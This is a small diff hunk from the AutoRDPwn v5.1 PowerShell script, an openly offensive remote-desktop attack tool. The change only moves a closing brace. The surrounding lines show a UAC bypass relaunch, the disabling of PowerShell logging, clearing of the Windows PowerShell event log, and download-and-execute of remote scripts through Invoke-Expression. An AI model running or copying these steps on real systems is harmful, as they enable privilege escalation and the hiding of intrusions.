@@ -9,12 +9,12 @@ if ($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.Window
 else { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath $args" ; exit }}}
 
 $Host.UI.RawUI.WindowTitle = "AutoRDPwn - v5.1 - by @JoelGMSec" ; $ProgressPreference = "SilentlyContinue" ; Set-StrictMode -Off ; $LogEngineLifeCycleEvent=$false ; $LogEngineHealthEvent=$false ; $LogProviderLifeCycleEvent=$false ; $LogProviderHealthEvent=$false ; Clear-EventLog "Windows PowerShell"
-$Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'}
+$Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'
 
 if ($local){ Import-Module $localpath\Resources\Design\Disable-Close.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/Disable-Close.ps1')}
 if (!$local){ (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/AutoRDPwn.ico","AutoRDPwn.ico")}
 if (!$local){ (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/Set-ConsoleIcon.ps1","Set-ConsoleIcon.ps1")}
-if ($local){ .\Resources\Design\Set-ConsoleIcon.ps1 .\Resources\Design\AutoRDPwn.ico } if (!$local){ .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico }
+if ($local){ .\Resources\Design\Set-ConsoleIcon.ps1 .\Resources\Design\AutoRDPwn.ico } if (!$local){ .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico }}
 
 function Show-Banner { Clear-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if($nogui -like '-nogui') { $null } else { 
      Write-Host
